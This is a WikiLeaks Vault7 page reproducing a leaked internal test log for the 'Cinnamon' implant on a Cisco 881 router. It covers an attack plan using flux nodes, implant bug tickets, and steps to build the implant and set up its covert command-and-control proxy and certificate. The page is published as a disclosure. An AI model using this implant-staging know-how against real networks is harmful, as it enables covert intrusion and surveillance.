<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" type="image/png" href="http://localhost:6081/IMG/favicon.ico">
        <title>Cinnamon Cisco881 Testing</title>
        <link href="../../bootstrap/css/bootstrap.min.css" rel="stylesheet">
        <link href="../../bootstrap/css/cerulean.min.css" rel="stylesheet">
        <link href="../../bootstrap/css/new-gen.css" rel="stylesheet">
        <link href="../../css/leak-styles.css" rel="stylesheet">
        <link href="../../highlighter/efatmarker.css" rel="stylesheet">
        <style>
          #efm-button {margin:0 0 4px 0;padding:0 0 0 30px;position:fixed;height:48px;width:52px;bottom:0;right:0;background:transparent '/highlighter/kedit-2.png' no-repeat bottom right;cursor:pointer;opacity:0.4;z-index:99999999999}
          #efm-button:hover {opacity:1}
          #efm-button #efm-menu {margin:0 0 52px 0;border:1px outset gray;padding:0;display:none;background:#eee;position:fixed;bottom:0;right:0;width:20em;opacity:1;cursor:auto}
          #efm-button:hover #efm-menu {display:block;font-size:smaller;color:#999}
          #efm-button #efm-menu p {margin:0;padding:0 3px}
          #efm-button #efm-menu a {margin:1px;padding:3px 3px;display:block;font:12px sans-serif;white-space:nowrap;opacity:inherit;cursor:pointer}
          #efm-button #efm-menu a:hover {color:black;background-color:white;opacity:1}
          #efm-button #efm-menu a > span {color:gray;position:absolute;right:4px}
          .efm-hi {background-color:#ff8;font-weight:normal;}
        </style>
        <link href="../../bootstrap/css/submit.css" rel="stylesheet">
        <link href="main.css" rel="stylesheet">
    </head>
    <body>
        <div id="submit_wlkey" class="submit_elem">
	<div class="container">
		<div class="text-center"><div class="submit_buttons btn-group" role="group">
			<a href="page_17760464.html#submit_help_contact" class="btn-wl btn-wl-empty">How to contact WikiLeaks?</a>
			<a href="page_17760464.html#submit_help_tor" class="btn-wl btn-wl-empty">What is Tor?</a>
			<a href="page_17760464.html#submit_help_tips" class="btn-wl btn-wl-empty">Tips for Sources</a>
			<a href="page_17760464.html#submit_help_after" class="btn-wl btn-wl-empty">After Submitting</a>
		</div></div>
		<p>This key's fingerprint is A04C 5E09 ED02 B328 03EB  6116 93ED 732E 9231 8DBA</p>
		<pre>
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQQNBFUoCGgBIADFLp+QonWyK8L6SPsNrnhwgfCxCk6OUHRIHReAsgAUXegpfg0b
rsoHbeI5W9s5to/MUGwULHj59M6AvT+DS5rmrThgrND8Dt0dO+XW88bmTXHsFg9K
jgf1wUpTLq73iWnSBo1m1Z14BmvkROG6M7+vQneCXBFOyFZxWdUSQ15vdzjr4yPR
oMZjxCIFxe+QL+pNpkXd/St2b6UxiKB9HT9CXaezXrjbRgIzCeV6a5TFfcnhncpO
ve59rGK3/az7cmjd6cOFo1Iw0J63TGBxDmDTZ0H3ecQvwDnzQSbgepiqbx4VoNmH
OxpInVNv3AAluIJqN7RbPeWrkohh3EQ1j+lnYGMhBktX0gAyyYSrkAEKmaP6Kk4j
/ZNkniw5iqMBY+v/yKW4LCmtLfe32kYs5OdreUpSv5zWvgL9sZ+4962YNKtnaBK3
1hztlJ+xwhqalOCeUYgc0Clbkw+sgqFVnmw5lP4/fQNGxqCO7Tdy6pswmBZlOkmH
XXfti6hasVCjT1MhemI7KwOmz/KzZqRlzgg5ibCzftt2GBcV3a1+i357YB5/3wXE
j0vkd+SzFioqdq5Ppr+//IK3WX0jzWS3N5Lxw31q8fqfWZyKJPFbAvHlJ5ez7wKA
1iS9krDfnysv0BUHf8elizydmsrPWN944Flw1tOFjW46j4uAxSbRBp284wiFmV8N
TeQjBI8Ku8NtRDleriV3djATCg2SSNsDhNxSlOnPTM5U1bmh+Ehk8eHE3hgn9lRp
2kkpwafD9pXaqNWJMpD4Amk60L3N+yUrbFWERwncrk3DpGmdzge/tl/UBldPoOeK
p3shjXMdpSIqlwlB47Xdml3Cd8HkUz8r05xqJ4DutzT00ouP49W4jqjWU9bTuM48
LRhrOpjvp5uPu0aIyt4BZgpce5QGLwXONTRX+bsTyEFEN3EO6XLeLFJb2jhddj7O
DmluDPN9aj639E4vjGZ90Vpz4HpN7JULSzsnk+ZkEf2XnliRody3SwqyREjrEBui
9ktbd0hAeahKuwia0zHyo5+1BjXt3UHiM5fQN93GB0hkXaKUarZ99d7XciTzFtye
/MWToGTYJq9bM/qWAGO1RmYgNr+gSF/fQBzHeSbRN5tbJKz6oG4NuGCRJGB2aeXW
TIp/VdouS5I9jFLapzaQUvtdmpaeslIos7gY6TZxWO06Q7AaINgr+SBUvvrff/Nl
l2PRPYYye35MDs0b+mI5IXpjUuBC+s59gI6YlPqOHXkKFNbI3VxuYB0VJJIrGqIu
Fv2CXwy5HvR3eIOZ2jLAfsHmTEJhriPJ1sUG0qlfNOQGMIGw9jSiy/iQde1u3ZoF
so7sXlmBLck9zRMEWRJoI/mgCDEpWqLX7hTTABEBAAG0x1dpa2lMZWFrcyBFZGl0
b3JpYWwgT2ZmaWNlIEhpZ2ggU2VjdXJpdHkgQ29tbXVuaWNhdGlvbiBLZXkgKFlv
dSBjYW4gY29udGFjdCBXaWtpTGVha3MgYXQgaHR0cDovL3dsY2hhdGMzcGp3cGxp
NXIub25pb24gYW5kIGh0dHBzOi8vd2lraWxlYWtzLm9yZy90YWxrKSA8Y29udGFj
dC11cy11c2luZy1vdXItY2hhdC1zeXN0ZW1Ad2lraWxlYWtzLm9yZz6JBD0EEwEK
ACcCGwMFCwkIBwMFFQoJCAsFFgIDAQACHgECF4AFAlb6cdIFCQOznOoACgkQk+1z
LpIxjbrlqh/7B2yBrryWhQMGFj+xr9TIj32vgUIMohq94XYqAjOnYdEGhb5u5B5p
BNowcqdFB1SOEvX7MhxGAqYocMT7zz2AkG3kpf9f7gOAG7qA1sRiB+R7mZtUr9Kv
fQSsRFPb6RNzqqB9I9wPNGhBh1YWusUPluLINwbjTMnHXeL96HgdLT+fIBa8ROmn
0fjJVoWYHG8QtsKiZ+lo2m/J4HyuJanAYPgL6isSu/1bBSwhEIehlQIfXZuS3j35
12SsO1Zj2BBdgUIrADdMAMLneTs7oc1/PwxWYQ4OTdkay2deg1g/N6YqM2N7rn1W
7A6tmuH7dfMlhcqw8bf5veyag3RpKHGcm7utDB6k/bMBDMnKazUnM2VQoi1mutHj
kTCWn/vF1RVz3XbcPH94gbKxcuBi8cjXmSWNZxEBsbirj/CNmsM32Ikm+WIhBvi3
1mWvcArC3JSUon8RRXype4ESpwEQZd6zsrbhgH4UqF56pcFT2ubnqKu4wtgOECsw
K0dHyNEiOM1lL919wWDXH9tuQXWTzGsUznktw0cJbBVY1dGxVtGZJDPqEGatvmiR
o+UmLKWyxTScBm5o3zRm3iyU10d4gka0dxsSQMl1BRD3G6b+NvnBEsV/+KCjxqLU
vhDNup1AsJ1OhyqPydj5uyiWZCxlXWQPk4p5WWrGZdBDduxiZ2FTj17hu8S4a5A4
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
J3x7gtxUMkTadELqwY6hrU8=
=BLTH
-----END PGP PUBLIC KEY BLOCK-----
		</pre>
	</div>
</div>

<div id="submit_help_contact" class="submit_elem">
	<div class="container">
		<div class="text-center"><div class="submit_buttons btn-group" role="group">
			<a href="page_17760464.html#submit_help_contact" class="btn-wl">How to contact WikiLeaks?</a>
			<a href="page_17760464.html#submit_help_tor" class="btn-wl btn-wl-empty">What is Tor?</a>
			<a href="page_17760464.html#submit_help_tips" class="btn-wl btn-wl-empty">Tips for Sources</a>
			<a href="page_17760464.html#submit_help_after" class="btn-wl btn-wl-empty">After Submitting</a>
		</div></div>

		<h3>Contact</h3>
		<p>If you need help using Tor you can contact WikiLeaks for assistance in setting it up using our simple webchat available at: <a href="https://wikileaks.org/talk">https://wikileaks.org/talk</a></p>
		<p>If you can use Tor, but need to contact WikiLeaks for other reasons use our secured webchat available at <b>http://wlchatc3pjwpli5r.onion</b></p>
		<p>We recommend contacting us over Tor if you can.</p>
	</div>
</div>

<div id="submit_help_tor" class="submit_elem">
	<div class="container">
		<div class="text-center"><div class="submit_buttons btn-group" role="group">
			<a href="page_17760464.html#submit_help_contact" class="btn-wl btn-wl-empty">How to contact WikiLeaks?</a>
			<a href="page_17760464.html#submit_help_tor" class="btn-wl">What is Tor?</a>
			<a href="page_17760464.html#submit_help_tips" class="btn-wl btn-wl-empty">Tips for Sources</a>
			<a href="page_17760464.html#submit_help_after" class="btn-wl btn-wl-empty">After Submitting</a>
		</div></div>

		<h3>Tor</h3>
		<p><a href="https://www.torproject.org">Tor</a> is an encrypted anonymising network that makes it harder to intercept internet communications, or see where communications are coming from or going to.</p>
		<p>In order to use the WikiLeaks public submission system as detailed above you can download the Tor Browser Bundle, which is a Firefox-like browser available for Windows, Mac OS X and GNU/Linux and pre-configured to connect using the anonymising system Tor.</p>
		<h4>Tails</h4>
		<p>If you are at high risk and you have the capacity to do so, you can also access the submission system through a secure operating system called <a href="https://tails.boum.org">Tails</a>. Tails is an operating system launched from a USB stick or a DVD that aim to leaves no traces when the computer is shut down after use and automatically routes your internet traffic through Tor. Tails will require you to have either a USB stick or a DVD at least 4GB big and a laptop or desktop computer.</p>
	</div>
</div>

<div id="submit_help_tips" class="submit_elem">
	<div class="container">
		<div class="text-center">
			<div class="submit_buttons btn-group" role="group">
				<a href="page_17760464.html#submit_help_contact" class="btn-wl btn-wl-empty">How to contact WikiLeaks?</a>
				<a href="page_17760464.html#submit_help_tor" class="btn-wl btn-wl-empty">What is Tor?</a>
				<a href="page_17760464.html#submit_help_tips" class="btn-wl">Tips for Sources</a>
				<a href="page_17760464.html#submit_help_after" class="btn-wl btn-wl-empty">After Submitting</a>
			</div>
		</div>

		<h3>Tips</h3>
		<p>Our submission system works hard to preserve your anonymity, but we recommend you also take some of your own precautions. Please review these basic guidelines. </p>
		<div>
			<h4>1. Contact us if you have specific problems</h4>
			<p>If you have a very large submission, or a submission with a complex format, or are a high-risk source, please <a href="page_17760464.html#submit_help_contact">contact us</a>. In our experience it is always possible to find a custom solution for even the most seemingly difficult situations.</p>
		</div>
		<div>
			<h4>2. What computer to use</h4>
			<p>If the computer you are uploading from could subsequently be audited in an investigation, consider using a computer that is not easily tied to you. Technical users can also use <a href="https://tails.boum.org">Tails</a> to help ensure you do not leave any records of your submission on the computer.</p>
		</div>
		<div>
			<h4>3. Do not talk about your submission to others</h4>
			<p>If you have any issues talk to WikiLeaks. We are the global experts in source protection – it is a complex field. Even those who mean well often do not have the experience or expertise to advise properly. This includes other media organisations.</p>
		</div>

	</div>
</div>

<div id="submit_help_after" class="submit_elem">
	<div class="container">
		<div class="text-center">
			<div class="submit_buttons btn-group" role="group">
				<a href="page_17760464.html#submit_help_contact" class="btn-wl btn-wl-empty">How to contact WikiLeaks?</a>
				<a href="page_17760464.html#submit_help_tor" class="btn-wl btn-wl-empty">What is Tor?</a>
				<a href="page_17760464.html#submit_help_tips" class="btn-wl btn-wl-empty">Tips for Sources</a>
				<a href="page_17760464.html#submit_help_after" class="btn-wl">After Submitting</a>
			</div>
		</div>

		<h3>After</h3>

		<div>
			<h4>1. Do not talk about your submission to others</h4>
			<p>If you have any issues talk to WikiLeaks. We are the global experts in source protection – it is a complex field. Even those who mean well often do not have the experience or expertise to advise properly. This includes other media organisations.</p>
		</div>

		<div>
			<h4>2. Act normal</h4>
			<p>If you are a high-risk source, avoid saying anything or doing anything after submitting which might promote suspicion. In particular, you should try to stick to your normal routine and behaviour.</p>
		</div>

		<div>
			<h4>3. Remove traces of your submission</h4>
			<p>If you are a high-risk source and the computer you prepared your submission on, or uploaded it from, could subsequently be audited in an investigation, we recommend that you format and dispose of the computer hard drive and any other storage media you used.</p>
			<p>In particular, hard drives retain data after formatting which may be visible to a digital forensics team and flash media (USB sticks, memory cards and SSD drives) retain data even after a secure erasure. If you used flash media to store sensitive data, it is important to destroy the media.</p>
			<p>If you do this and are a high-risk source you should make sure there are no traces of the clean-up, since such traces themselves may draw suspicion.</p>
			<div>
				<h4>4. If you face legal action</h4>
				<p>If a legal action is brought against you as a result of your submission, there are organisations that may help you. The Courage Foundation is an international organisation dedicated to the protection of journalistic sources. You can find more details at <a href="https://www.couragefound.org">https://www.couragefound.org</a>.</p>
			</div>
		</div>
	</div>
</div>

<div id="submit" class="submit_banner">
	<div class="container">
		<div class="page-header">
			<h1>Submit documents to WikiLeaks</h1>
			<a class="remove-button" href="page_17760464.html#"><span class="glyphicon glyphicon-remove-circle"></span></a>
		</div>
		<p>WikiLeaks publishes documents of political or historical importance that are censored or otherwise suppressed. We specialise in strategic global publishing and large archives.</p>
		<p>The following is the address of our secure site where you can anonymously upload your documents to WikiLeaks editors. You can only access this submissions system through Tor. (See our <a href="page_17760464.html#submit_help_tor">Tor tab</a> for more information.) We also advise you to read our <a href="page_17760464.html#submit_help_tips">tips for sources</a> before submitting.</p>

		<div class="alert alert-info">
			<div class="onion-url">wlupld3ptjvsgwqw.onion</div>
			<div>
				Copy this address into your Tor browser. Advanced users, if they wish, can also add a further layer of encryption to their submission using <a href="page_17760464.html#submit_wlkey">our public PGP key</a>.
			</div>
		</div>

		<p>If you cannot use Tor, or your submission is very large, or you have specific requirements, WikiLeaks provides several alternative methods. <a href="page_17760464.html#submit_help_contact">Contact us</a> to discuss how to proceed.</p>
	</div>
</div>
<div id="submit_help_buttons" class="submit_elem">
	<div class="container">
		<div class="text-center">
			<div class="submit_buttons btn-group" role="group">
				<a href="page_17760464.html#submit_help_contact" class="btn-wl btn-wl-empty">How to contact WikiLeaks?</a>
				<a href="page_17760464.html#submit_help_tor" class="btn-wl btn-wl-empty">What is Tor?</a>
				<a href="page_17760464.html#submit_help_tips" class="btn-wl btn-wl-empty">Tips for Sources</a>
				<a href="page_17760464.html#submit_help_after" class="btn-wl btn-wl-empty">After Submitting</a>
			</div>
		</div>
	</div>
</div>

        <div id="main">
            

<link href="../../static/css/styles_topnav.css" rel="stylesheet">
<link href="../../static/css/styles_sidenav.css" rel="stylesheet">
<div class="top-navigation">
  <nav class="navbar">
      <a href="page_17760464.html#menu" class="mobile-only hot-dog nav-element">
      </a>
    <div class="nav-logo">
      <a href="https://wikileaks.org">
        <h1>WikiLeaks</h1>
      </a>
    </div>
    <div class="action-buttons">
      <a class="button-face support-link" href="https://wikileaks.spreadshirt.com/" target="_blank">Shop</a>
      <a class="button-face donate-link" href="https://shop.wikileaks.org/donate">Donate</a>
      <a class="button-face submit-link" href="page_17760464.html#submit">Submit</a>
    </div>
    <form class="global-search" method="get" action="https://search.wikileaks.org/">
      <input type="text" name="q" placeholder="Search">
      <button class="btn-search" type="submit"></button>
    </form>
    <div class="main-nav">
      
        <ul class="first-level">
          
            <li>
              <a class=" leaks-menu-item" href="https://wikileaks.org/-Leaks-.html">Leaks</a>
            </li>
          
            <li>
              <a class=" news-menu-item" href="https://wikileaks.org/-News-.html">News</a>
            </li>
          
            <li>
              <a class=" about-menu-item" href="https://wikileaks.org/-About-66-.html">About</a>
            </li>
          
            <li>
              <a class=" partners-menu-item" href="https://wikileaks.org/-Partners-.html">Partners</a>
            </li>
          
        </ul>
      
    </div>
  </nav>
</div><nav id="menu" class="side-nav rub">
  <div class="menu-wrapper">
    <a class="close-btn nav-element" href="page_17760464.html#"></a>
    
      <ul class="first-level">
        
          <li>
            <a class=" leaks-menu-item" href="https://wikileaks.org/-Leaks-.html">Leaks</a>
            
          </li>
        
          <li>
            <a class=" news-menu-item" href="https://wikileaks.org/-News-.html">News</a>
            
          </li>
        
          <li>
            <a class=" about-menu-item" href="https://wikileaks.org/-About-66-.html">About</a>
            
          </li>
        
          <li>
            <a class=" partners-menu-item" href="https://wikileaks.org/-Partners-.html">Partners</a>
            
          </li>
        
      </ul>
    
    <aside class="friends mobile-only">
      
        <ul class="first-level">
          
            <li>
              <a href="https://www.torproject.org/" target="_blank">Tor Project</a>
            </li>
          
            <li>
              <a href="https://tails.boum.org/" target="_blank">Tails</a>
            </li>
          
            <li>
              <a href="https://www.couragefound.org/" target="_blank">Courage</a>
            </li>
          
            <li>
              <a href="https://www.bitcoin.org/" target="_blank">Bitcoin</a>
            </li>
          
        </ul>
      
    </aside>
    <aside class="social mobile-only">
      <ul>
        <li>
          <a href="https://www.facebook.com/wikileaks" class="nav-element" target="_blank" alt="Facebook">
            <img class="img-responsive" src="../../static/img/fb-logo.png" alt="Facebook" title="Facebook page" />
          </a>
        </li>
        <li>
          <a href="https://twitter.com/wikileaks" class="nav-element" target="_blank" alt="Twitter">
            <img class="img-responsive" src="../../static/img/twitter-logo.png" alt="Twitter" title="Twitter page" />
          </a>
        </li>
      </ul>
    </aside>
  </div>
</nav>

            <div class="container-fluid row-fluid">
                <div class="col-xs-12 col-sm-12 col-md-10 container-text">
                    <div class="leak-header">
                        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><body>
<div class="title-area">
    <h1 class="leak-title">Vault7: CIA Hacking Tools Revealed</h1>
    <img src="../logo.png">
</div>

</body></html>

                        <ul class="leak-navigation">
                            <a href="../index.html"><li>Releases</li></a>
                            <a href="index.html"><li class="active">Documents</li></a>
                       </ul>
                    </div>
                    <p>Navigation:  » <a href="index.html">Directory</a> » <a href="space_15204355.html">Network Devices Branch (NDB)</a> » <a href="page_14587805.html">Network Devices Branch</a> » <a href="page_14588814.html">Operations/Testing</a> » <a href="page_17760462.html">JQJSECONDCUT</a></p>
<hr>
                    <div id="uniquer">
                        <p>Owner: <a class="user" href="user_14588839.html"><span class="user">User #71467</span></a></p>
<h2>Cinnamon Cisco881 Testing</h2>
<h1 style="text-align: center;">Cinnamon 881 Testing</h1>
<p>The Bakery delivered Cinnamon for the Cisco881 on June 8.  Testing Cinnamon for use on an 881 for JQJSECONDCUT.  Operator has provided Target device configuration as well as some show commands from the Target.  This device is getting <span class="glossary">DHCP<span class="glossary-tt">Dynamic Host Configuration Protocol</span></span> from an Internet provider, and is performing <span class="glossary">NAT<span class="glossary-tt">Network Address Translation</span></span> and <span class="glossary">DHCP<span class="glossary-tt">Dynamic Host Configuration Protocol</span></span> server role for inside hosts.  This device is also configured for DMVPN, presumably for <span class="glossary">VOIP<span class="glossary-tt">Voice over Internet Protocol (Internet telephony)</span></span> traffic.  CONOP will be to use at least two flux nodes, one outside the target network, and then exit and attack from a flux node on the inside LAN.</p>
<h2>Testing Summary</h2>
<ul>
<li>Cinnamon implant has swindle.crt file size limitation (CMN-1) - confirmed fixed in 5.0.2</li>
<li>Observed one crash during low mem/high CPU condition with IXIA traffic - not confirmed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> related (CMN-4)</li>
<li>Potential issue with a different <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> - device took a long time to boot (CMN-5)</li>
<li>Issue with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> not squelching <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> replies was fixed in version 5.0.1 (CMN-7) - confirmed fixed in 5.0.1</li>
<li>The Bakery recommends not using redir and survey at the same time (CMN-8)</li>
<li>Issues with Blot signatures - DF bit not set by CMN, Encrypted Alert not sent by <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> (CMN-9, CMN0-10)</li>
<li>Discussed adding a feature to disable active internet detection with trigger packet (CMN-11)</li>
<li>Potential performance issue with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> depending on how busy the target is normally (CMN-12)</li>
<li>cpp code check issues (CMN-13, CMN-14)</li>
<li>Observed anomalous output after issuing debug if-mgr trace all - might be <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> issue since it is observed on 881 with no CMN, and no upgrade <span class="glossary">ROMMON<span class="glossary-tt">Read-Only Memory Monitor Cisco bootstrap program</span></span> (CMN-15)</li>
<li>Issue with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> detecting PAT correctly causing C2 failure (CMN-16) confirmed fixed in 5.0.2</li>
<li>CMN <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> listener timeout too short (CMN-17) - confirmed fixed in 5.0.3</li>
<li>Issue with User Agent string identified by The Bakery - <span style="color: rgb(255,0,0);">need to confirm fix in 5.0.2</span>
</li>
<li>Operator may be able to set up a redirector for us to test with</li>
<li>Bug 497 - Null pointer dereference when Host: field not present in User Agent string sniffed by Cinnamon - confirmed fixed in 5.0.3</li>
</ul>
<p> </p>
<h2>Progress/Notes</h2>
<p>Cinnamon Setup Steps:</p>
<ul>
<li>Build implant on BuildVM<ul>
<li>Edit /impant/cinnamon.cfg<ul>
<li>Edit LP_DOMAIN_NAME to match the dns entry for the Blot Proxy server - <span class="external">www.suptest.com</span> in our test case</li>
<li>Edit Tool ID that will be used by beastbox/swindle to identify Cinnamon traffic - 0x9219D10C for our test case (this is arbitrary)</li>
<li>Edit PROBE_DEST entries so that they all say something that will resolve to web server - <span class="external">www.google.com</span> in our test case</li>
</ul>
</li>
<li>Create cmn-880-norb.bin file for No Reboot, non-persisten implant<ul><li>make clean 880-norb - outputs a folder called 880-norb</li></ul>
</li>
<li>Create modules needed for testing - from /implant/modules directory<ul>
<li>make clean survey-powerpc</li>
<li>make clean redir-powerpc</li>
</ul>
</li>
</ul>
</li>
<li>Setup Blot 4.3 on CentOS 5.6 VMs<ul>
<li>Beastbox and Swindle on Blot Proxy<ul>
<li>Copy Blot 4.3 on to Blot Proxy VM</li>
<li>Install Beastbox and Swindle from rpms</li>
<li>Edit /etc/blot/beastbox.cfg<ul>
<li>Edit external-ip to be the IP of the Blot Proxy server - 172.20.13.10 in our test case</li>
<li>Edit th name to spicerackH</li>
<li>Edit ip to Blot Spicerack server - 172.20.13.11 in our test case</li>
<li>Remove other th name entries</li>
<li>Edit server name Apache ip to the Cover Web server for 443 - 172.20.13.20 in our test case</li>
<li>Edit the server name Apache_2 ip to the Cover Web server for 80 - 172.20.13.20 in our test case </li>
<li>Edit the server name <span class="glossary">BIND<span class="glossary-tt"><span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server software</span></span> ip to our <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server for the test - <span class="redact">X.X.X.X (LVLT-GOGL-8-8-8[US])</span> in our test case</li>
<li>Under itd swindle, edit tid num to Tool ID that has been baked into impant - 0x9219D10C in our test case</li>
<li>Under itd swindle, edit th to spicerackH</li>
<li>Remove other itd entries</li>
</ul>
</li>
<li>Generate a certificate to match the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> name for Blot Proxy and save to file in /etc/blot/itds/swindle/swindle.crt<ul>
<li>openssl genrsa -out new_key.pem 1024</li>
<li>openssl req -new -key new_key.pem -out new_req.csr</li>
<li>openssl x509 -req -days 365 -in new_req.csr -signkey new_key.pem -out new_cert.crt</li>
<li><span style="color: rgb(255,0,0);">Note that <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> does not work with a larger key size - modulus 2048 does not work - CMN-1</span></li>
